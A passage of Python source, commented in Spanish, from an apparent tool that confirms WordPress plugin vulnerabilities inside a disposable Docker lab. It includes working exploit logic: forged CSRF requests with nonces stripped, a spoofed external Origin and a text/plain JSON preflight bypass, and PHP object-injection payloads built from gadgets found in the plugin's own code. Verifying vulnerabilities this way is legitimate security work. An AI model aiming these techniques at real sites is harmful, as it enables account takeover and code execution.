            if res.evidence.get("tecnica") == "htaccess-chain":
                res.detail = (f"FILE UPLOAD confirmado (cadena .htaccess): se subio un .htaccess "
                              f"que reinterpreta .jpg como PHP, y luego '"
                              f"{res.evidence['filename_ganador']}' se EJECUTO como tal -- el "
                              f"endpoint acepta subir .htaccess arbitrario, cadena clasica de "
                              f"escalada a RCE")
            else:
                res.detail = (f"FILE UPLOAD confirmado: '{res.evidence['filename_ganador']}' se "
                              f"subio via {file_param} y, al pedirlo en "
                              f"{res.evidence['url_publica_ganadora']}, el servidor lo EJECUTO "
                              f"como PHP (devolvio una suma calculada por el interprete, no el "
                              f"codigo fuente) -- prueba inequivoca de webshell, no solo de que "
                              f"la subida fue aceptada")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de nombre/extension/magic-bytes y "
                          f"la cadena .htaccess, y ninguna produjo un fichero que se ejecutara "
                          f"como PHP -- el file-upload no se confirmo (puede que valide de "
                          f"verdad la extension/el tipo MIME/el contenido, o el campo/endpoint no "
                          f"sean los reales)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_csrf(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, email_param_hint: str = "", pass_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica CSRF reproduciendo la peticion de cambio de email/password que la hipotesis
    describe, pero con el escenario classico de self-CSRF: el ADMIN se ataca a si mismo via una
    pagina ajena que visita por error. La peticion:
      - usa la sesion YA autenticada del propio admin (con su password ORIGINAL).
      - quita activamente cualquier parametro cuyo nombre contenga 'nonce'/'token'/'csrf', aunque
        la hipotesis lo citara -- queremos la peticion mas desnuda posible, para no confundir un
        nonce correcto que colase por casualidad con una proteccion real.
      - manda Origin/Referer de un dominio EXTERNO ficticio (simulando que vino de una pagina
        ajena, no de wp-admin).
    Se marca verificado SOLO si el efecto ocurrio de verdad (segundo login con la password nueva,
    o lectura del email realmente cambiado en la base de datos) -- igual de exigente que
    verify_wordpress_account_takeover, no un 200/302 solo."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    email_p = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
    pass_p = pass_param_hint or _pick_param(parameters, _PASS_HINTS)
    if not (email_p or pass_p):
        res.detail = "no se identifico un parametro de email ni de password en la hipotesis"
        res.limitations.append("la verificacion de CSRF (self-targeting) necesita un parametro "
                               "de email o de password; afina 'parameters' en la hipotesis del "
                               "LLM o pasalos a mano")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res
        if boot.admin_sess is None:
            res.detail = ("no se pudo autenticar como admin con su password original -- no se "
                          "puede simular el self-CSRF sin esa sesion")
            return res

        m = (http_method or "POST").upper()
        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
        for k in list(payload.keys()):
            if any(h in k.lower() for h in ("nonce", "token", "csrf")):
                del payload[k]
        new_email = f"csrf-takeover-{_token()}@binoracle-lab.invalid" if email_p else None
        new_pass = secrets.token_urlsafe(10) if pass_p else None
        if email_p:
            payload[email_p] = new_email
        if pass_p:
            payload[pass_p] = new_pass
        id_p = _pick_param(parameters, _ID_HINTS)
        if id_p:
            payload[id_p] = boot.admin_id

        headers_base = {"Origin": "https://binoracle-csrf-lab.invalid",
                        "Referer": "https://binoracle-csrf-lab.invalid/evil-page.html"}
        res.evidence.update({
            "admin_user": boot.admin_user, "admin_password_original": boot.admin_pass,
            "payload_forjado": payload, "origin_ficticio": headers_base["Origin"],
            "metodo": m, "endpoint": endpoint,
        })

        def check_effect():
            """Relee el estado real (segundo login o DB) tras CADA intento de entrega -- nunca se
            confirma por un 200/302 solo."""
            if new_pass:
                sess = _wp_login(boot.base_url, boot.admin_user, new_pass)
                return sess is not None
            if new_email:
                r = lab.wp_cli("user", "get", boot.admin_user, "--field=user_email", timeout=30)
                return (r.stdout or "").strip() == new_email
            return False

        # variantes de ENTREGA: la peticion normal del metodo declarado (form-encoded, como la
        # haria un <form> real), JSON (si el endpoint es una API REST que espera un body JSON), y
        # el truco clasico de JSON-via-text/plain -- un <form> SI puede mandar Content-Type:
        # text/plain con un body de texto arbitrario (sin preflight CORS), asi que si el
        # endpoint hace json_decode($raw_body) sin mirar el Content-Type, este bypass funciona
        # igual que un <form> normal, sin necesitar JavaScript ni fetch().
        import json as _json_mod
        delivery_attempts = [
            ("form-encoded (formulario real)", lambda: boot.admin_sess.request(
                m, boot.base_url + endpoint, data=payload if m != "GET" else None,
                params=payload if m == "GET" else None, headers=headers_base, timeout=20)),
            ("JSON (application/json)", lambda: boot.admin_sess.request(
                m, boot.base_url + endpoint, json=payload,
                headers={**headers_base, "Content-Type": "application/json"}, timeout=20)),
            ("JSON via text/plain (bypass de preflight, enviable desde un <form>)", lambda: boot.admin_sess.request(
                m, boot.base_url + endpoint, data=_json_mod.dumps(payload),
                headers={**headers_base, "Content-Type": "text/plain"}, timeout=20)),
        ]
        confirmed = False
        delivery_tried = []
        for label, send_fn in delivery_attempts:
            step(f"enviando la peticion forjada -- {label}, sesion del admin, SIN nonce, "
                 f"Origin/Referer externo ficticio...")
            try:
                resp = send_fn()
                status = resp.status_code
            except Exception as e:
                delivery_tried.append({"modo": label, "error": str(e)})
                continue
            ok_effect = check_effect()
            delivery_tried.append({"modo": label, "status": status, "efecto_confirmado": ok_effect})
            if ok_effect:
                confirmed = True
                res.evidence["modo_entrega_ganador"] = label
                res.evidence["status_code_respuesta"] = status
                break
        res.evidence["intentos_entrega"] = delivery_tried
        if new_pass:
            res.evidence["segundo_login_password_nueva"] = confirmed
        elif new_email:
            res.evidence["email_esperado"] = new_email

        if confirmed:
            res.verified = True
            res.ok = True
            res.detail = (f"CSRF confirmado ({res.evidence['modo_entrega_ganador']}): una "
                          f"peticion SIN nonce, con Origin/Referer de un dominio externo "
                          f"ficticio, usando la sesion YA autenticada del admin, cambio de "
                          f"verdad su propia cuenta -- el endpoint no comprueba nonce ni origen")
            step(f"VERIFICADO: CSRF confirmado ({res.evidence['modo_entrega_ganador']}) -- la "
                 f"peticion forjada sin nonce cambio la cuenta del admin.")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(delivery_tried)} formas de entrega (form-encoded, "
                          f"JSON, JSON via text/plain) de la peticion forjada y en ninguna se "
                          f"confirmo el efecto -- el CSRF no se confirmo (puede que el endpoint "
                          f"SI compruebe nonce/origen, o que el payload/endpoint no sean los "
                          f"reales)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_deserialization(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, serial_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica insecure deserialization (PHP Object Injection) en DOS pasos, ambos con prueba
    dura (ver deserialize_gadgets.py para el porque de este diseño):

    1) ESTATICO: escanea el codigo REAL ya descargado del plugin (find_file_write_gadget) en
       busca de una clase con __wakeup()/__destruct() que escriba una propiedad publica
       (controlada por el atacante) a una ruta tambien publica (controlada por el atacante) via
       file_put_contents(). Si no encuentra ninguna, no se intenta nada mas -- sin un gadget real
       en el propio codigo, no hay nada que verificar sin inventarse una cadena de terceros.
    2) DINAMICO: construye el objeto PHP serializado de verdad con esa clase (secrets.token_hex
       como contenido, una ruta canario como destino), lo manda al parametro/endpoint que la
       hipotesis cita, y confirma leyendo el fichero REAL dentro del contenedor -- si el
       CONTENIDO EXACTO aparece ahi, es prueba de que unserialize() reconstruyo el objeto de
       verdad y su metodo magico se ejecuto, no una deduccion por status code."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    from .deserialize_gadgets import find_file_write_gadget, build_php_serialized_object
    plugin_root = os.path.join(plugin_source_dir, slug)
    step("escaneando el codigo real en busca de un gadget de deserializacion (clase con "
         "__wakeup()/__destruct() que escriba a fichero)...")
    gadget = find_file_write_gadget(plugin_root)
    if gadget is None:
        res.detail = ("no se encontro ningun gadget de deserializacion en el codigo del plugin "
                      "(una clase con __wakeup()/__destruct() que escriba una propiedad publica "
                      "a una ruta publica via file_put_contents())")
        res.limitations.append("la verificacion de deserializacion SOLO cubre gadgets dentro del "
                               "propio codigo del plugin (no cadenas de librerias de terceros "
                               "como Monolog/Guzzle -- eso necesitaria PHPGGC u otra herramienta "
                               "dedicada); si el plugin no trae una clase asi, no hay nada que "
                               "verificar sin inventarse una cadena que no esta")
        return res
    step(f"gadget encontrado: clase '{gadget.full_class_name}' en {gadget.file}:{gadget.line} "
         f"({gadget.magic_method} -> file_put_contents($this->{gadget.path_prop}, "
         f"$this->{gadget.content_prop}))")

    serial_param = serial_param_hint or _pick_param(parameters, _SERIAL_HINTS)

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_deser_{_token()}.txt"
        payload_obj = build_php_serialized_object(gadget, canary_path, secret)
        m = (http_method or "POST").upper()
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "gadget_clase": gadget.full_class_name, "gadget_metodo": gadget.magic_method,
            "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
            "canary_secret": secret, "objeto_serializado": payload_obj,
            "serial_param": serial_param or "(cuerpo crudo)", "metodo": m, "endpoint": endpoint,
        })

        tried = []
        found = False

        def try_send(label, **kwargs):
            nonlocal found
            step(f"probando {m} {endpoint} ({label})...")
            try:
                boot.sub_sess.request(m, boot.base_url + endpoint, timeout=20, **kwargs)
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            time.sleep(1)   # el __destruct() puede dispararse al final de la peticion, no antes
            r = lab.sh("exec", lab.wp, "sh", "-c", f"cat {canary_path} 2>/dev/null", timeout=10)
            content = (r.stdout or "")
            present = secret in content
            tried.append({"modo": label, "secreto_presente": present})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                res.evidence["contenido_fichero"] = content[:500]
                step(f"VERIFICADO: el fichero {canary_path} contiene el secreto exacto -- "
                     f"unserialize() reconstruyo el objeto y {gadget.magic_method} se ejecuto.")

        if serial_param:
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[serial_param] = payload_obj
            try_send("parametro de formulario",
                     data=payload if m != "GET" else None,
                     params=payload if m == "GET" else None)
        if not found:
            try_send("cuerpo crudo", data=payload_obj.encode())

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"DESERIALIZATION confirmada ({res.evidence['modo_ganador']}): el "
                          f"objeto PHP serializado de la clase '{gadget.full_class_name}' se "
                          f"reconstruyo de verdad y su {gadget.magic_method} escribio el secreto "
                          f"exacto en {canary_path} -- prueba inequivoca de PHP Object Injection, "
                          f"no una deduccion por status code")
        else:
            res.ok = True
            res.detail = (f"se encontro el gadget '{gadget.full_class_name}' en el codigo pero "
                          f"ninguna forma de mandarlo ({len(tried)} probadas) hizo que el "
                          f"fichero canario apareciera con el secreto -- la deserializacion no "
                          f"se confirmo (puede que el endpoint/parametro no sean los reales, o "
                          f"que el valor no se pase a unserialize() sin filtrar)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_deserialization_custom_table(
    plugin_source_dir: str, slug: str, store_endpoint: str, store_http_method: str,
    store_parameters, table_name: str, column_name: str, id_column: str = "id",
    serial_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Variante EN DOS PASOS de verify_wordpress_deserialization, apuntando al mecanismo REAL de
    object injection almacenado en WordPress -- NO la API de Options/Transients (ver
    verify_wordpress_deserialization_stored, que se probo en vivo y se retiro: maybe_serialize()
    vuelve a serializar un string que ya parece serializado desde WP 3.6.1/2013, asi que ese
    camino esta cerrado desde hace mas de una decada), sino una TABLA PROPIA del plugin escrita
    con SQL crudo via $wpdb->insert()/update() -- eso NO pasa por maybe_serialize() en absoluto,
    asi que el string del atacante sobrevive intacto en la columna hasta que algo la lea con
    unserialize().

    Dos pasos, cada uno una accion real:
      1) PASO 1: se envia el objeto PHP serializado de verdad (mismo gadget que
         verify_wordpress_deserialization encuentra con find_file_write_gadget) al endpoint que
         lo guarda en la tabla propia, como atacante de bajo privilegio.
      2) PASO 2: se fuerza la lectura+unserialize() REAL via wp-cli (`wp eval`) -- se lee la fila
         mas reciente de `table_name`/`column_name` (ORDER BY `id_column` DESC LIMIT 1, la
         convencion casi universal de clave primaria autoincremental) y se llama a unserialize()
         sobre ella en el MISMO proceso PHP que ya tiene cargados todos los plugins activos (el
         bootstrap completo de WordPress, igual que cualquier visita real a una pagina que haga
         esa misma lectura) -- no es una simulacion, es la funcion real ejecutandose.

    `verified` SOLO pasa a True si el fichero canario aparece con el secreto exacto DESPUES del
    paso 2."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    from .deserialize_gadgets import find_file_write_gadget, build_php_serialized_object
    plugin_root = os.path.join(plugin_source_dir, slug)
    step("escaneando el codigo real en busca de un gadget de deserializacion...")
    gadget = find_file_write_gadget(plugin_root)
    if gadget is None:
        res.detail = ("no se encontro ningun gadget de deserializacion en el codigo del plugin "
                      "(una clase con __wakeup()/__destruct() que escriba una propiedad publica "
                      "a una ruta publica via file_put_contents())")
        res.limitations.append("la verificacion de deserializacion por tabla propia tambien "
                               "necesita un gadget real en el propio codigo; si no hay ninguno, "
                               "no hay nada que verificar sin inventarse una cadena de terceros")
        return res
    step(f"gadget encontrado: clase '{gadget.full_class_name}' en {gadget.file}:{gadget.line} "
         f"({gadget.magic_method} -> file_put_contents($this->{gadget.path_prop}, "
         f"$this->{gadget.content_prop}))")

    if not table_name or not column_name:
        res.detail = "no se dio la tabla/columna propia donde se almacena el valor"
        res.limitations.append("la verificacion de deserializacion por tabla propia necesita "
                               "saber en que tabla y columna guarda el valor el plugin (p.ej. "
                               "tabla 'wp_myplugin_tokens', columna 'token_data') -- miralo en "
                               "el $wpdb->insert()/update() real del codigo y pasalo a mano "
                               "(table_name/column_name)")
        return res

    serial_param = serial_param_hint or _pick_param(store_parameters, _SERIAL_HINTS)

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        # igual que en la variante de options (ver el commit que la retiro): el PASO 2 lo
        # ejecuta un contenedor wp-cli EFIMERO Y SEPARADO (--rm), asi que la ruta canario tiene
        # que vivir en el VOLUMEN COMPARTIDO para sobrevivir y ser visible desde el contenedor
        # Apache despues -- confirmado en vivo que /tmp del contenedor wp-cli se pierde al
        # terminar.
        canary_path = f"/var/www/html/binoracle_canary_{_token()}.txt"
        payload_obj = build_php_serialized_object(gadget, canary_path, secret)
        m = (store_http_method or "POST").upper()
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "gadget_clase": gadget.full_class_name, "gadget_metodo": gadget.magic_method,
            "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
            "canary_secret": secret, "objeto_serializado": payload_obj,
            "tabla": table_name, "columna": column_name, "columna_id": id_column,
            "serial_param": serial_param or "(cuerpo crudo)", "metodo": m,
            "store_endpoint": store_endpoint,
        })

        step(f"PASO 1/2 -- almacenando el objeto serializado via {m} {store_endpoint} (sesion "
             f"de '{boot.sub_user}', bajo privilegio)...")
        payload = dict(store_parameters) if isinstance(store_parameters, dict) else {p: "" for p in (store_parameters or [])}
        tried_store = []
        stored_ok = False

        def try_store(label, **kwargs):
            nonlocal stored_ok
            try:
                r = boot.sub_sess.request(m, boot.base_url + store_endpoint, timeout=20, **kwargs)
                tried_store.append({"modo": label, "status": r.status_code})
                stored_ok = True
            except Exception as e:
                tried_store.append({"modo": label, "error": str(e)})

        if serial_param:
            p1 = dict(payload)
            p1[serial_param] = payload_obj
            try_store("parametro de formulario",
                     data=p1 if m != "GET" else None, params=p1 if m == "GET" else None)
        if not stored_ok:
            try_store("cuerpo crudo", data=payload_obj.encode())
        res.evidence["intentos_paso1"] = tried_store
        if not stored_ok:
            res.detail = "el PASO 1 (almacenar) fallo en todas las formas probadas"
            return res

        step(f"PASO 2/2 -- forzando la lectura+unserialize() REAL via wp-cli (SELECT "
             f"{column_name} FROM {table_name} ORDER BY {id_column} DESC LIMIT 1)...")
        php_snippet = (
            f"global $wpdb; "
            f"$row = $wpdb->get_var(\"SELECT {column_name} FROM {table_name} "
            f"ORDER BY {id_column} DESC LIMIT 1\"); "
            f"if ($row) {{ unserialize($row); }} else {{ echo 'BINORACLE_NO_ROW'; }}"
        )
        r2 = lab.wp_cli("eval", php_snippet, timeout=30)
        res.evidence["wp_cli_salida"] = ((r2.stdout or "") + (r2.stderr or ""))[:500]
        if "BINORACLE_NO_ROW" in (r2.stdout or ""):
            res.detail = (f"el PASO 1 no dejo ninguna fila en {table_name}.{column_name} -- la "
                          f"tabla/columna no son las reales, o el endpoint no escribio ahi")
            return res

        time.sleep(1)
        rcheck = lab.sh("exec", lab.wp, "sh", "-c", f"cat {canary_path} 2>/dev/null", timeout=10)
        content = rcheck.stdout or ""
        present = secret in content
        res.evidence["secreto_presente"] = present
        if present:
            res.verified = True
            res.ok = True
            res.detail = (f"DESERIALIZATION confirmada (tabla propia, en dos pasos): el objeto "
                          f"serializado guardado en el PASO 1 en {table_name}.{column_name} se "
                          f"reconstruyo de verdad al leerlo+unserialize() en el PASO 2 -- su "
                          f"{gadget.magic_method} escribio el secreto exacto en {canary_path}")
            step(f"VERIFICADO: {canary_path} contiene el secreto -- deserializacion por tabla "
                 f"propia confirmada.")
        else:
            res.ok = True
            res.detail = (f"se almaceno el payload en el paso 1 y se forzo la lectura+"
                          f"unserialize() en el paso 2, pero el fichero canario no aparecio -- "
                          f"no se confirmo (puede que la tabla/columna no sean las reales, que "
                          f"el valor se guarde escapado/modificado antes del INSERT, o que la "
                          f"columna tenga un tipo que trunque el valor)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()
